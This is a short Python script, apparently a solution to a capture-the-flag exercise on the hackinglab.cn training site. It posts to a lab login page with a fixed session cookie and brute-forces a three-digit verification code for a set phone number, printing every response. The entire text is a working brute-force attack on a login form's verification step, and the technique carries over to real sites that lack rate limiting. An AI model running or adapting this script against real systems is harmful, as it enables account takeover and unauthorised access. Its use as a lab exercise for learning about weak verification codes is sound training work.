#-*- coding:utf-8 -*-
import requests
s = requests.Session()
url = 'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'
headers = {
    'Cookie':'PHPSESSID=907adae29d3e9e03deeb5f30e06e8463',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
    'Referer':'http://hackinglab.cn/ShowQues.php?type=scripts',
}
r = s.post(url,headers=headers)
for v in range(100,1000):
    payload = {
        'username':'13399999999',
        'vcode':v,
    }
    h = s.post(url,data=payload,headers=headers)
    print(str(v) + h.text)
